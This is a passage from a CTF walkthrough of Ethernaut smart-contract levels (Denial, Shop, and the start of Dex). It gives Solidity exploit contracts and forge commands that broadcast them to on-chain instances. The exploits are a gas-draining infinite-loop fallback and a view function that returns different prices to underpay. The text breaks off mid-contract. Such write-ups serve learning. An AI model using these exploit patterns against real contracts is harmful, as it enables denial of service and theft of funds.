<p><strong>Explanation:</strong></p>
<ol>
<li>We should revert the call when the owner calls the <code>withdraw()</code> function. But if we do a simple revert in our contract fallback it won’t work.</li>
<li>Because withdraw function doesn’t check for the return value.</li>
<li>One thing we can do is, drain the gas of the transaction that is sent by the owner.</li>
<li>Call to partner is made by the <code>call</code> which will forward all the remaining gas to the external call.</li>
<li>So, we can drain all the gas by writing a most expensive computation in Partner contract.</li>
<li>I have written an infinite loop inside the fallback of the Attack contract and registered the Attack contract as the partner in Denial contract</li>
</ol>
<p><strong>Level20Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>Denial</span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#569CD6">from</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level20.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level20Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    Denial </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Denial</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x222eE4906Ab1064Af1c66ccA78c71F9a47b18EAE</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Hack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Hack</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        Denial </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Denial</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x222eE4906Ab1064Af1c66ccA78c71F9a47b18EAE</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">setWithdrawPartner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">fallback</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#6a9955">//draining the entire gas with infinite loop</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">uint</span><span> i </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">while</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>i </span><span class="token" style="color:#d4d4d4">&lt;</span><span> </span><span class="token" style="color:#b5cea8">10</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level20Solution.s.sol:Level20Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Shop</h2>
<p><strong>Level21.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">interface</span><span> </span><span class="token" style="color:#4ec9b0">Buyer</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">price</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">view</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Shop</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">uint</span><span> </span><span class="token" style="color:#569CD6">public</span><span> price </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">100</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">bool</span><span> </span><span class="token" style="color:#569CD6">public</span><span> isSold</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">buy</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    Buyer _buyer </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Buyer</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>_buyer</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">price</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> price </span><span class="token" style="color:#d4d4d4">&amp;&amp;</span><span> </span><span class="token" style="color:#d4d4d4">!</span><span>isSold</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>      isSold </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>      price </span><span class="token" style="color:#d4d4d4">=</span><span> _buyer</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">price</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>Сan you get the item from the shop for less than the price asked?</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>This is similar to the Elevator challenge. Elevator uses a an external normal function to call.</li>
<li>But here <code>price()</code> should a view function. Which shouldn’t modify the storage of the contract.</li>
<li>So, we cant just keep the number of the calls to the <code>price()</code> function in our Attack contract.</li>
<li>We can make use of <code>isSold</code> variable to check that the <code>price()</code> is called or not. This can be acceptable inside a view function.</li>
<li>So, I wrote Attack contract with <code>price()</code> function defined as view and it returns two different price values for the initial call and second call.</li>
</ol>
<p><strong>Level21Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>Shop</span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#569CD6">from</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level21.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level21Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    Shop </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Shop</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x0a21654f3EA8917a109E09C32eC3aAF814e8d665</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    Shop </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">Shop</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x0a21654f3EA8917a109E09C32eC3aAF814e8d665</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">buy</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">price</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#569CD6">view</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">isSold</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#b5cea8">100</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#b5cea8">9</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level21Solution.s.sol:Level21Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Dex</h2>
<p><strong>Level22.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;openzeppelin-contracts/contracts/token/ERC20/IERC20.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;openzeppelin-contracts/contracts/token/ERC20/ERC20.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&#x27;openzeppelin-contracts/contracts/access/Ownable.sol&#x27;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Dex</span><span> </span><span class="token" style="color:#569CD6">is</span><span> </span><span class="token" style="color:#dcdcaa">Ownable</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x00</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> token1</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> token2</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setTokens</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> _token1</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> _token2</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> onlyOwner </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    token1 </span><span class="token" style="color:#d4d4d4">=</span><span> _token1</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    token2 </span><span class="token" style="color:#d4d4d4">=</span><span> _token2</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">addLiquidity</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> token_address</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> onlyOwner </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>token_address</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transferFrom</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>  </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>  </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">swap</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">uint</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> token1 </span><span class="token" style="color:#d4d4d4">&amp;&amp;</span><span> to </span><span class="token" style="color:#d4d4d4">==</span><span> token2</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">||</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> token2 </span><span class="token" style="color:#d4d4d4">&amp;&amp;</span><span> to </span><span class="token" style="color:#d4d4d4">==</span><span> token1</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Invalid tokens&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balanceOf</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">&gt;=</span><span> amount</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">&quot;Not enough to swap&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">uint</span><span> swapAmount </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">getSwapPrice</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">,</span><span> to</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">from</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transferFrom</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>to</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">approve</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> swapAmount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#dcdcaa">IERC20</span><span class="token" style="color:#d4d4d4">(</span><span>to</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transferFrom</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">,</span><span> swapAmount</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
